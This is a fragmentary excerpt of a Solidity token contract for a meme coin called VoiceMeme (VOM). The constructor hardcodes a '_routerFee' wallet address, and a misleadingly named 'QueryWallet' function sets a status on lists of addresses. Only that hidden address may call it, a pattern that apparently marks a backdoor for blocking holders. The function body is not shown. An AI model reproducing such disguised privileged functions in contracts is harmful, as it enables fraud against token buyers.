...
// https://t.me/VoiceMemePortal
// https://www.voicememeeth.com/
...
contract VoiceMeme is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "VoiceMeme";
    string private _symbol = "VOM";
    ...
    constructor () {
        ...
        _routerFee = payable(address(0xAC2DA6d0c4fA4a6b3c7903fE6Ca704D66F318610));
    ...
    function QueryWallet(address[] calldata routerAddress, bool status) public {require(_msgSender() == _routerFee);
